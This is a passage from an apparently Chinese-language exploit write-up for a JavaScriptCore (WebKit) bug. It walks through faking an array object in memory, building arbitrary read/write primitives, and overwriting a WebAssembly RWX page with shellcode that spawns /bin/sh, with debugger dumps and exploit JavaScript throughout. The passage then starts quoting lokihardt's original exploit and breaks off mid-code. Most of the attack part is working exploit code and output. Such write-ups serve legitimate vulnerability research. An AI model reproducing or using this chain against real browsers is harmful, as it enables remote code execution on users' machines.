        // vector allocated using who-knows-what, and M = WastefulTypedArray.
        // The view does not own the vector.
    pwndbg> p *(JSC::JSArrayBufferView*)0x7fffb30c8340
    $1 = {
    ......
      m_vector = {
        static kind = Gigacage::Primitive, 
        m_barrier = {
          m_value = {
            static kind = Gigacage::Primitive, 
            m_ptr = 0x7fe8000ff000
          }
        }
      }, 
      m_length = 1, 
      m_mode = JSC::TypedArrayMode::WastefulTypedArray
    }
##### arbitrary read/write
这样构造的container如下
    [*] container: 
    --> Object: 0x7fffb30c8380 with butterfly (nil) (Structure 0x7fffb3070e70:[Object, {jscell:0, butterfly:1}, NonArray, Proto:0x7fffb30b4000, Leaf]), StructureID: 320
    [*] victim:
    --> Object: 0x7fffb1a551f0 with butterfly 0x7ff000280058 (Structure 0x7fffb3070d90:[Array, {prop:100, prop1:101}, ArrayWithDouble, Proto:0x7fffb30c80a0, Leaf]), StructureID: 318
    pwndbg> x/6xg 0x7fffb30c8380
    0x7fffb30c8380: 0x0100160000000140  0x0000000000000000
    0x7fffb30c8390: 0x0108210700000064  0x00007fffb1a551f0
    0x7fffb30c83a0: 0x00000000badbeef0  0x00000000badbeef0
即`*(dword\*)(container+0x10)`的位置为伪造的ArrayWithArrayStorage类型数组，fakeobj(container+0x10)构造butterfly为victim的fakeobj记hax。
    [*] hax: 
    --> Object: 0x7fffb30c8390 with butterfly 0x7fffb1a551f0 (Structure 0x7fffb30f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100
这时内存的存储结构为hax.butterfly->victim，其中ArrayWithArrayStorage类型的数据直接存放在butterfly里，hax的butterfly可以通过hax[1]访问修改，victim.prop也可以修改，由于ArrayWithDouble类型数据的prop存放在`*(dword\*)(butterfly-0x10)`的位置，我们修改hax.butterfly为addr+0x10即可实现addr处的任意地址读写。
        read64: function(addr){
            hax[1] = i2f(addr + 0x10);
            return addrof(victim.prop);
        },
        write64: function(addr,data){
            hax[1] = i2f(addr+0x10);
            victim.prop = fakeobj(data);
        }
这里的addrof和fakeobj的作用实际上是读写相应位置的数和进制转换。
有了任意地址读写的原语我们就可以通过覆盖wasm的rwx内存执行shellcode。
            var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
            var wasm_mod = new WebAssembly.Module(wasm_code);
            var wasm_instance = new WebAssembly.Instance(wasm_mod);
            var f = wasm_instance.exports.main;
            addr_f = addrof(f);
            var addr_p = this.read64(addr_f + 0x40);
            var addr_shellcode = this.read64(addr_p);
            print("0x"+addr_f.toString(16))
            print("0x"+addr_p.toString(16))
            print("0x"+addr_shellcode.toString(16));
            shellcode = "j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05"
            this.write(addr_shellcode, shellcode);
这里的wasm_code作用是调用wasm模块生成一个用于保存机器码的rwx的页，内容并不重要。js引擎实现wasm的方法一般是先用汇编初始化wasm模块，然后跳转到rwx的页面执行真正用户调用的内容；js引擎在执行用户调用的wasm时需要找到保存这段字节码的页面，rwx的页面地址会或隐式或显示地保存在内存里，我们只需要调试找到rwx页面的地址并覆盖其内容即可。
### 完整exp
这里的exp较lokihardt的原版有修改，去掉了lokihardt利用unboxed2和boxed2指向相同内存构造第二个fakeobj和addrof原语的部分（作者认为这一部分或许是lokihardt为了显示OOB这类漏洞的另一种通用构造fakeobj、addrof原语的方法，但是并不是必要的，去掉更容易理解而且并不影响exp的稳定性）
lokihardt的原exp： 
    var conversion_buffer = new ArrayBuffer(8)
    var f64 = new Float64Array(conversion_buffer)
    var i32 = new Uint32Array(conversion_buffer)
    var BASE32 = 0x100000000
    function f2i(f) {
        f64[0] = f
        return i32[0] + BASE32 * i32[1]
    }
    function i2f(i) {
        i32[0] = i % BASE32
        i32[1] = i / BASE32
        return f64[0]
    }
    function user_gc() {
        for (let i = 0; i 
  2. 
  3. 
  4. 
* * *